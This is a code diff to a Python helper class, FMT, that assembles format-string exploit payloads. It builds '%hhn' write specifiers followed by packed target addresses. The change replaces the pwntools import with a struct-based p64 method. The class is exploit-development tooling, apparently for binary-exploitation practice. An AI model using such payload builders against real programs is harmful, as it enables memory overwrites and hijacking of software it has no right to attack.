@@ -1,6 +1,5 @@
 import math
-
-from pwn import *
+import struct
 
 class FMT:
     hhn = "%{}c%{}$hhn"
@@ -13,6 +12,9 @@ class FMT:
         self.address = []
         self.fmt = []
         self.printed = 0
+
+    def p64(self, data, fmt = "<Q"):
+        return struct.pack(fmt, data)
 
     def _append(self, address, fmt):
         self.address.append(address)
@@ -51,7 +53,7 @@ class FMT:
         payload = b""
         for i, fmt in enumerate(self.fmt): payload += fmt.format(offset + distance + i).encode('ascii')
         payload += b"\x00" * (8 - len(payload) % 8)
-        payload += b''.join(map(p64, self.address))
+        payload += b''.join(map(self.p64, self.address))
         
         # reset
         self.printed = 0
